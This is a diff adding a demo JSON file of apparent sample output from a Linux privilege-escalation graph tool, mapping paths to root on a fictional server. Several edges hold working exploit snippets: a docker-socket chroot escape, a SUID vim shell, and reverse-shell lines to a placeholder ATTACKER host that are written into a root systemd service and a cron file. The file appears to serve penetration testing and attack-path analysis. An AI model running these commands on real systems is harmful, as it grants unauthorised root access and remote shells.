@@ -1,0 +1,45 @@
+// Copyright 2026 AdverXarial, byt3n33dl3.
+//
+// Licensed under the MIT License,
+// you may not use this file except in compliance with the License.
+// You may obtain a copy of the License at
+
+{
+  "metadata": {
+    "hostname": "demo-server",
+    "ip": "192.168.1.100",
+    "os": "Ubuntu 22.04.3 LTS",
+    "kernel": "5.15.0-91-generic",
+    "arch": "x86_64",
+    "collected_at": "2024-02-13T10:30:00Z",
+    "collector": "pypengu",
+    "collector_version": "1.0.0",
+    "collected_as": "www-data",
+    "uid": "33"
+  },
+  "nodes": [
+    {"id": "user:www-data", "type": "user", "label": "www-data", "properties": {"uid": "33", "shell": "/usr/sbin/nologin", "is_current": true, "is_root": false}},
+    {"id": "user:deploy", "type": "user", "label": "deploy", "properties": {"uid": "1001", "shell": "/bin/bash", "is_current": false, "is_root": false}},
+    {"id": "user:root", "type": "user", "label": "root", "properties": {"uid": "0", "shell": "/bin/bash", "is_current": false, "is_root": true}},
+    {"id": "group:docker", "type": "group", "label": "docker", "properties": {"gid": "999", "is_privileged": true}},
+    {"id": "group:sudo", "type": "group", "label": "sudo", "properties": {"gid": "27", "is_privileged": true}},
+    {"id": "binary:/usr/bin/vim", "type": "binary", "label": "vim", "properties": {"path": "/usr/bin/vim", "owner": "root", "suid": true, "gtfobin": true, "gtfobin_url": "https://gtfobins.github.io/gtfobins/vim/"}},
+    {"id": "service:backup", "type": "service", "label": "backup.service", "properties": {"path": "/etc/systemd/system/backup.service", "run_as": "root", "state": "enabled"}},
+    {"id": "cron:cleanup", "type": "cron", "label": "cleanup (cron)", "properties": {"path": "/etc/cron.d/cleanup", "schedule": "*/5 * * * *", "run_as": "root"}}
+  ],
+  "edges": [
+    {"id": "e1", "source": "user:www-data", "target": "group:docker", "type": "MemberOf", "risk": "medium", "properties": {}},
+    {"id": "e2", "source": "group:docker", "target": "user:root", "type": "DockerAccess", "risk": "critical", "properties": {"socket": "/var/run/docker.sock", "exploit_snippet": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"}},
+    {"id": "e3", "source": "user:deploy", "target": "group:sudo", "type": "MemberOf", "risk": "medium", "properties": {}},
+    {"id": "e4", "source": "group:sudo", "target": "user:root", "type": "SudoAll", "risk": "critical", "properties": {"nopasswd": false, "entry": "deploy ALL=(ALL:ALL) ALL"}},
+    {"id": "e5", "source": "user:www-data", "target": "binary:/usr/bin/vim", "type": "SuidBinary", "risk": "high", "properties": {"path": "/usr/bin/vim", "gtfobin": true, "gtfobin_url": "https://gtfobins.github.io/gtfobins/vim/", "exploit_snippet": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}},
+    {"id": "e6", "source": "user:www-data", "target": "service:backup", "type": "WritableService", "risk": "critical", "properties": {"path": "/etc/systemd/system/backup.service", "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /etc/systemd/system/backup.service && systemctl daemon-reload"}},
+    {"id": "e7", "source": "user:deploy", "target": "cron:cleanup", "type": "WritableCron", "risk": "high", "properties": {"path": "/etc/cron.d/cleanup", "schedule": "*/5 * * * *", "exploit_snippet": "echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /etc/cron.d/cleanup"}},
+    {"id": "e8", "source": "user:www-data", "target": "user:root", "type": "KernelExploit", "risk": "high", "properties": {"kernel_version": "5.15.0-91-generic", "cve": "CVE-2023-0386", "description": "OverlayFS privilege escalation", "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-0386"}}
+  ],
+  "stats": {
+    "total_nodes": 8,
+    "total_edges": 8,
+    "paths_to_root": 4
+  }
+}
